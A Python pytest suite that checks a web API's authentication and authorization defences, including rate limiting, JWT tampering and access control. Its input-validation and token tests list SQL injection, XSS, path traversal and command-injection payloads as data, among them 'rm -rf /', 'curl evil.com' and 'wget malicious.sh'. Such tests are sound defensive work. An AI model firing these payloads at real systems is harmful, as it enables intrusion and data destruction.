import pytest
from httpx import AsyncClient
from datetime import datetime, timedelta
import asyncio
import uuid
from unittest.mock import patch, MagicMock
import time

# Mark all tests in this file as async
pytestmark = pytest.mark.asyncio

# Test data
ADMIN_USER_DATA = {
    "email": "admin@test.com",
    "password": "a_very_secure_password"
}

VALID_TEST_USER = {
    "email": "security_test_user@example.com",
    "password": "SecurePassword123!",
    "first_name": "Security",
    "last_name": "Test"
}

# Helper functions
async def get_admin_token(client: AsyncClient):
    """Helper to get admin authentication token"""
    login_data = {
        "username": ADMIN_USER_DATA["email"],
        "password": ADMIN_USER_DATA["password"],
    }
    response = await client.post("/v1/auth/login", data=login_data)
    return response.json()["access_token"]

async def create_test_user(client: AsyncClient, admin_token: str, user_data: dict):
    """Helper to create a test user"""
    headers = {"Authorization": f"Bearer {admin_token}"}
    response = await client.post("/v1/users/", json=user_data, headers=headers)
    return response

class TestRateLimiting:
    """Test rate limiting and brute force protection"""

    async def test_multiple_failed_login_attempts(self, client: AsyncClient):
        """Test multiple consecutive failed login attempts"""
        failed_login_data = {
            "username": "test@example.com",
            "password": "wrong_password",
        }

        failed_attempts = []
        # Make multiple failed attempts
        for i in range(10):
            response = await client.post("/v1/auth/login", data=failed_login_data)
            failed_attempts.append(response.status_code)
            # Small delay between attempts to simulate real usage
            await asyncio.sleep(0.1)

        # All should fail with 401
        assert all(code == 401 for code in failed_attempts)

        # Note: In a real implementation, after X failed attempts,
        # the system should start returning 429 (Too Many Requests)
        # or implement temporary account lockout

    async def test_rapid_login_attempts_same_ip(self, client: AsyncClient):
        """Test rapid login attempts from same IP (rate limiting)"""
        login_data = {
            "username": ADMIN_USER_DATA["email"],
            "password": ADMIN_USER_DATA["password"],
        }

        # Make rapid consecutive requests
        responses = []
        for i in range(20):
            response = await client.post("/v1/auth/login", data=login_data)
            responses.append(response.status_code)
            # No delay to simulate rapid requests

        # Most should succeed (200), but rate limiting might kick in
        successful_logins = sum(1 for code in responses if code == 200)
        rate_limited = sum(1 for code in responses if code == 429)

        # At least some should succeed
        assert successful_logins > 0
        # In a real implementation, some might be rate limited
        # assert rate_limited > 0  # Uncomment when rate limiting is implemented

    async def test_account_lockout_after_failed_attempts(self, client: AsyncClient):
        """Test account lockout after multiple failed attempts"""
        admin_token = await get_admin_token(client)

        # Create test user
        user_data = VALID_TEST_USER.copy()
        user_data["email"] = f"lockout_test_{uuid.uuid4()}@example.com"
        create_response = await create_test_user(client, admin_token, user_data)
        assert create_response.status_code == 201

        # Make multiple failed login attempts
        failed_login_data = {
            "username": user_data["email"],
            "password": "wrong_password",
        }

        for i in range(5):  # Simulate brute force
            response = await client.post("/v1/auth/login", data=failed_login_data)
            assert response.status_code == 401
            await asyncio.sleep(0.1)

        # Try to login with correct password - should work unless lockout is implemented
        correct_login_data = {
            "username": user_data["email"],
            "password": user_data["password"],
        }
        response = await client.post("/v1/auth/login", data=correct_login_data)

        # In current implementation, should still work (200)
        # In a locked-out system, should return 423 (Locked) or 401
        assert response.status_code in [200, 401, 423]

    async def test_ip_based_rate_limiting(self, client: AsyncClient):
        """Test IP-based rate limiting across different accounts"""
        # This test simulates multiple login attempts from the same IP
        # but to different accounts

        admin_token = await get_admin_token(client)

        # Create multiple test users
        test_users = []
        for i in range(3):
            user_data = VALID_TEST_USER.copy()
            user_data["email"] = f"ip_test_{i}_{uuid.uuid4()}@example.com"
            await create_test_user(client, admin_token, user_data)
            test_users.append(user_data)

        # Make many login attempts across different accounts
        responses = []
        for i in range(15):
            user = test_users[i % len(test_users)]
            login_data = {
                "username": user["email"],
                "password": user["password"],
            }
            response = await client.post("/v1/auth/login", data=login_data)
            responses.append(response.status_code)

        # Most should succeed
        successful_logins = sum(1 for code in responses if code == 200)
        assert successful_logins > 0

class TestInputValidationSecurity:
    """Test input validation and injection prevention"""

    async def test_sql_injection_attempts_in_email(self, client: AsyncClient):
        """Test SQL injection attempts in email field"""
        sql_injection_attempts = [
            "admin@test.com'; DROP TABLE users; --",
            "admin@test.com' OR '1'='1",
            "admin@test.com'; DELETE FROM users WHERE '1'='1'; --",
            "admin@test.com' UNION SELECT * FROM users --",
            "admin@test.com'; INSERT INTO users VALUES('hacker', 'pass'); --"
        ]

        for malicious_email in sql_injection_attempts:
            login_data = {
                "username": malicious_email,
                "password": "anypassword",
            }
            response = await client.post("/v1/auth/login", data=login_data)
            # Should not cause any errors, just return 401
            assert response.status_code == 401
            assert "detail" in response.json()

    async def test_xss_payload_injection(self, client: AsyncClient):
        """Test XSS payload injection in various fields"""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<svg onload=alert('xss')>"
        ]

        for payload in xss_payloads:
            # Test in email field
            login_data = {
                "username": payload,
                "password": "password",
            }
            response = await client.post("/v1/auth/login", data=login_data)
            assert response.status_code in [401, 422]

            # Ensure response doesn't reflect the payload unescaped
            response_text = response.text
            assert "<script>" not in response_text
            assert "javascript:" not in response_text

    async def test_path_traversal_attempts(self, client: AsyncClient):
        """Test path traversal attempts in various inputs"""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd"
        ]

        for traversal_attempt in path_traversal_attempts:
            login_data = {
                "username": traversal_attempt,
                "password": "password",
            }
            response = await client.post("/v1/auth/login", data=login_data)
            assert response.status_code in [401, 422]

    async def test_large_payload_handling(self, client: AsyncClient):
        """Test handling of very large payloads"""
        # Test with very large email (potential DoS)
        large_email = "a" * 10000 + "@example.com"
        large_password = "b" * 10000

        login_data = {
            "username": large_email,
            "password": large_password,
        }

        response = await client.post("/v1/auth/login", data=login_data)
        # Should handle gracefully, not crash
        assert response.status_code in [401, 422, 413]  # 413 = Payload Too Large

    async def test_malformed_json_handling(self, client: AsyncClient):
        """Test handling of malformed JSON in requests"""
        malformed_payloads = [
            '{"email": "test@example.com", "password": }',  # Missing value
            '{"email": "test@example.com" "password": "test"}',  # Missing comma
            '{"email": "test@example.com", "password": "test",}',  # Trailing comma
            '{email: "test@example.com", "password": "test"}',  # Unquoted key
            '{"email": "test@example.com", "password": "test"',  # Missing closing brace
        ]

        for payload in malformed_payloads:
            # Use raw request to send malformed JSON
            try:
                response = await client.post(
                    "/v1/auth/password/reset-request",
                    content=payload,
                    headers={"Content-Type": "application/json"}
                )
                # Should return 422 (validation error) or 400 (bad request)
                assert response.status_code in [400, 422]
            except Exception:
                # If it raises an exception, that's also acceptable
                pass

class TestJWTTokenSecurity:
    """Test JWT token security features"""

    async def test_jwt_token_tampering(self, client: AsyncClient):
        """Test detection of tampered JWT tokens"""
        # Get a valid token first
        login_data = {
            "username": ADMIN_USER_DATA["email"],
            "password": ADMIN_USER_DATA["password"],
        }
        response = await client.post("/v1/auth/login", data=login_data)
        valid_token = response.json()["access_token"]

        # Create tampered versions
        tampered_tokens = [
            valid_token[:-5] + "xxxxx",  # Change last 5 characters
            valid_token.replace(".", "x", 1),  # Change first dot
            "fake." + valid_token.split(".", 1)[1],  # Change header
            valid_token.split(".")[0] + ".fake." + valid_token.split(".")[2],  # Change payload
        ]

        for tampered_token in tampered_tokens:
            headers = {"Authorization": f"Bearer {tampered_token}"}
            response = await client.get("/v1/auth/me", headers=headers)
            assert response.status_code == 401

    async def test_token_replay_attacks(self, client: AsyncClient):
        """Test token replay attack scenarios"""
        # Login and get token
        login_data = {
            "username": ADMIN_USER_DATA["email"],
            "password": ADMIN_USER_DATA["password"],
        }
        response = await client.post("/v1/auth/login", data=login_data)
        token = response.json()["access_token"]

        # Use token multiple times (should work in current implementation)
        for i in range(5):
            headers = {"Authorization": f"Bearer {token}"}
            response = await client.get("/v1/auth/me", headers=headers)
            assert response.status_code == 200

        # Note: In a more secure implementation, tokens might have
        # one-time use restrictions or short expiration times

    async def test_token_injection_attempts(self, client: AsyncClient):
        """Test various token injection attempts"""
        injection_attempts = [
            "Bearer valid_token; rm -rf /",
            "Bearer valid_token && curl evil.com",
            "Bearer valid_token || wget malicious.sh",
            "Bearer valid_token`whoami`",
            "Bearer valid_token$(id)",
        ]

        for malicious_token in injection_attempts:
            headers = {"Authorization": malicious_token}
            response = await client.get("/v1/auth/me", headers=headers)
            assert response.status_code == 401

    async def test_weak_secret_detection(self, client: AsyncClient):
        """Test that system doesn't accept weak JWT secrets"""
        # This test would be more relevant during configuration/deployment
        # Here we just ensure tokens are properly validated

        weak_tokens = [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",  # Well-known test token
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.XbPfbIHMI6arZ3Y922BhjWgQzWXcXNrz0ogtVhfEd2o",  # Another common test token
        ]

        for weak_token in weak_tokens:
            headers = {"Authorization": f"Bearer {weak_token}"}
            response = await client.get("/v1/auth/me", headers=headers)
            assert response.status_code == 401

class TestPasswordSecurity:
    """Test password security features"""

    async def test_password_hash_security(self, client: AsyncClient):
        """Test that passwords are properly hashed and not exposed"""
        admin_token = await get_admin_token(client)

        # Create test user
        user_data = VALID_TEST_USER.copy()
        user_data["email"] = f"hash_test_{uuid.uuid4()}@example.com"
        create_response = await create_test_user(client, admin_token, user_data)
        assert create_response.status_code == 201

        # Get user profile
        headers = {"Authorization": f"Bearer {admin_token}"}
        users_response = await client.get("/v1/users/", headers=headers)
        assert users_response.status_code == 200

        users = users_response.json()
        # Ensure password is never exposed in API responses
        for user in users:
            assert "password" not in user
            assert "password_hash" not in user
            assert user_data["password"] not in str(user)

    async def test_password_complexity_validation(self, client: AsyncClient):
        """Test password complexity requirements"""
        admin_token = await get_admin_token(client)

        # Test weak passwords during password change
        login_data = {
            "username": ADMIN_USER_DATA["email"],
            "password": ADMIN_USER_DATA["password"],
        }
        login_response = await client.post("/v1/auth/login", data=login_data)
        user_token = login_response.json()["access_token"]
        user_headers = {"Authorization": f"Bearer {user_token}"}

        weak_passwords = [
            "123",              # Too short
            "password",         # Common password
            "12345678",         # Only numbers
            "abcdefgh",         # Only lowercase
            "ABCDEFGH",         # Only uppercase
            "!@#$%^&*",         # Only special chars
        ]

        for weak_password in weak_passwords:
            change_data = {
                "current_password": ADMIN_USER_DATA["password"],
                "new_password": weak_password
            }
            response = await client.post("/v1/auth/password/change", json=change_data, headers=user_headers)

            # Should either succeed (if no validation) or fail with validation error
            # In a secure system, weak passwords should be rejected
            if response.status_code == 400:
                assert "password" in response.json()["detail"].lower()

    async def test_password_history_prevention(self, client: AsyncClient, reset_admin_password):
        """Test prevention of password reuse"""
        admin_token = await get_admin_token(client)

        # Create test user
        user_data = VALID_TEST_USER.copy()
        user_data["email"] = f"history_test_{uuid.uuid4()}@example.com"
        create_response = await create_test_user(client, admin_token, user_data)
        assert create_response.status_code == 201

        # Login as test user
        login_data = {
            "username": user_data["email"],
            "password": user_data["password"],
        }
        login_response = await client.post("/v1/auth/login", data=login_data)
        user_token = login_response.json()["access_token"]
        headers = {"Authorization": f"Bearer {user_token}"}

        # Change password
        new_password = "NewSecurePassword123!"
        change_data = {
            "current_password": user_data["password"],
            "new_password": new_password
        }
        response = await client.post("/v1/auth/password/change", json=change_data, headers=headers)

        if response.status_code == 204:
            # Login with new password to get new token
            new_login_data = {
                "username": user_data["email"],
                "password": new_password,
            }
            new_login_response = await client.post("/v1/auth/login", data=new_login_data)
            if new_login_response.status_code == 200:
                new_token = new_login_response.json()["access_token"]
                new_headers = {"Authorization": f"Bearer {new_token}"}

                # Try to change back to original password
                revert_data = {
                    "current_password": new_password,
                    "new_password": user_data["password"]  # Original password
                }
                revert_response = await client.post("/v1/auth/password/change", json=revert_data, headers=new_headers)

                # In a secure system, this should be prevented
                # Current implementation might allow it
                assert revert_response.status_code in [204, 400]

class TestAuthorizationSecurity:
    """Test authorization and privilege escalation prevention"""

    async def test_privilege_escalation_attempts(self, client: AsyncClient, reset_admin_password):
        """Test prevention of privilege escalation"""
        admin_token = await get_admin_token(client)

        # Create a regular test user
        user_data = VALID_TEST_USER.copy()
        user_data["email"] = f"privilege_test_{uuid.uuid4()}@example.com"
        create_response = await create_test_user(client, admin_token, user_data)
        assert create_response.status_code == 201

        # Login as regular user
        login_data = {
            "username": user_data["email"],
            "password": user_data["password"],
        }
        login_response = await client.post("/v1/auth/login", data=login_data)

        if login_response.status_code == 200:
            user_token = login_response.json()["access_token"]
            user_headers = {"Authorization": f"Bearer {user_token}"}

            # Try to access admin-only endpoints
            admin_endpoints = [
                "/v1/users/",       # User management
                "/v1/roles/",       # Role management
                "/v1/permissions/", # Permission management
            ]

            for endpoint in admin_endpoints:
                response = await client.get(endpoint, headers=user_headers)
                # Regular user should not have access to admin endpoints
                # Should return 403 (Forbidden) or 401 (Unauthorized)
                assert response.status_code in [401, 403]

    async def test_role_manipulation_attempts(self, client: AsyncClient, reset_admin_password):
        """Test prevention of unauthorized role manipulation"""
        admin_token = await get_admin_token(client)

        # Create test user
        user_data = VALID_TEST_USER.copy()
        user_data["email"] = f"role_test_{uuid.uuid4()}@example.com"
        create_response = await create_test_user(client, admin_token, user_data)

        if create_response.status_code == 201:
            user_id = create_response.json().get("_id")

            # Login as regular user
            login_data = {
                "username": user_data["email"],
                "password": user_data["password"],
            }
            login_response = await client.post("/v1/auth/login", data=login_data)

            if login_response.status_code == 200:
                user_token = login_response.json()["access_token"]
                user_headers = {"Authorization": f"Bearer {user_token}"}

                # Try to modify own roles (if endpoint exists)
                role_update_data = {
                    "roles": ["platform_admin", "client_admin"]
                }

                response = await client.put(f"/v1/users/{user_id}", json=role_update_data, headers=user_headers)
                # Should be forbidden
                assert response.status_code in [401, 403, 404]

    async def test_permission_bypass_attempts(self, client: AsyncClient, reset_admin_password):
        """Test prevention of permission bypass attempts"""
        # Test various ways users might try to bypass permissions

        # Try to access endpoints with manipulated tokens
        admin_token = await get_admin_token(client)

        # Try to access with no authorization header
        response = await client.get("/v1/users/")
        assert response.status_code == 401

        # Try with empty authorization header
        headers = {"Authorization": ""}
        response = await client.get("/v1/users/", headers=headers)
        assert response.status_code == 401

        # Try with malformed authorization header
        malformed_headers = [
            {"Authorization": "InvalidFormat"},
            {"Authorization": "Bearer"},  # Missing token
            {"Authorization": "Basic dGVzdDp0ZXN0"},  # Wrong auth type
        ]

        for headers in malformed_headers:
            response = await client.get("/v1/users/", headers=headers)
            assert response.status_code == 401

class TestDataProtection:
    """Test data protection and privacy features"""

    async def test_sensitive_data_exposure_prevention(self, client: AsyncClient, reset_admin_password):
        """Test that sensitive data is not exposed in responses"""
        admin_token = await get_admin_token(client)
        headers = {"Authorization": f"Bearer {admin_token}"}

        # Test user endpoints
        response = await client.get("/v1/users/", headers=headers)
        if response.status_code == 200:
            users = response.json()
            for user in users:
                # Sensitive fields should not be present
                sensitive_fields = [
                    "password", "password_hash", "ssn", "credit_card",
                    "bank_account", "private_key", "secret"
                ]
                for field in sensitive_fields:
                    assert field not in user

        # Test own profile endpoint
        me_response = await client.get("/v1/auth/me", headers=headers)
        if me_response.status_code == 200:
            profile = me_response.json()
            assert "password" not in profile
            assert "password_hash" not in profile

    async def test_audit_log_integrity(self, client: AsyncClient, reset_admin_password):
        """Test that security events are properly logged"""
        # This test would verify that security events are logged
        # For now, we just test that operations complete without errors

        # Failed login attempt
        failed_login_data = {
            "username": "nonexistent@example.com",
            "password": "wrongpassword",
        }
        response = await client.post("/v1/auth/login", data=failed_login_data)
        assert response.status_code == 401

        # Successful login
        successful_login_data = {
            "username": ADMIN_USER_DATA["email"],
            "password": ADMIN_USER_DATA["password"],
        }
        response = await client.post("/v1/auth/login", data=successful_login_data)
        assert response.status_code == 200

        # Password change attempt
        if response.status_code == 200:
            token = response.json()["access_token"]
            headers = {"Authorization": f"Bearer {token}"}

            change_data = {
                "current_password": "wrong_current",
                "new_password": "NewPassword123!"
            }
            change_response = await client.post("/v1/auth/password/change", json=change_data, headers=headers)
            # Should fail but be logged
            assert change_response.status_code == 400

class TestSecurityHeaders:
    """Test security headers and CORS"""

    async def test_security_headers_presence(self, client: AsyncClient):
        """Test that proper security headers are set"""
        response = await client.get("/v1/auth/me")

        # Check for common security headers
        security_headers = [
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]

        for header in security_headers:
            # Note: These might not be implemented yet
            # The test documents what should be present
            if header in response.headers:
                assert response.headers[header] is not None

    async def test_cors_configuration(self, client: AsyncClient):
        """Test CORS headers are properly configured"""
        # Test preflight request
        response = await client.options("/v1/auth/login")

        # Should handle OPTIONS request
        assert response.status_code in [200, 204, 405]

        # Check CORS headers if present
        cors_headers = [
            "Access-Control-Allow-Origin",
            "Access-Control-Allow-Methods",
            "Access-Control-Allow-Headers"
        ]

        for header in cors_headers:
            if header in response.headers:
                assert response.headers[header] is not None

class TestTimingAttacks:
    """Test prevention of timing attacks"""

    async def test_login_timing_consistency(self, client: AsyncClient):
        """Test that login timing doesn't reveal information"""
        import time

        # Test login with valid user but wrong password
        start_time = time.time()
        response1 = await client.post("/v1/auth/login", data={
            "username": ADMIN_USER_DATA["email"],
            "password": "wrong_password"
        })
        time1 = time.time() - start_time

        # Test login with non-existent user
        start_time = time.time()
        response2 = await client.post("/v1/auth/login", data={
            "username": "nonexistent@example.com",
            "password": "any_password"
        })
        time2 = time.time() - start_time

        # Both should return 401
        assert response1.status_code == 401
        assert response2.status_code == 401

        # Timing difference should be minimal to prevent user enumeration
        # Note: This is a basic test - in practice, you'd need multiple samples
        # and statistical analysis to properly test timing attack prevention
        time_difference = abs(time1 - time2)
        # Allow for reasonable variance (this is just an example threshold)
        assert time_difference < 1.0  # Less than 1 second difference
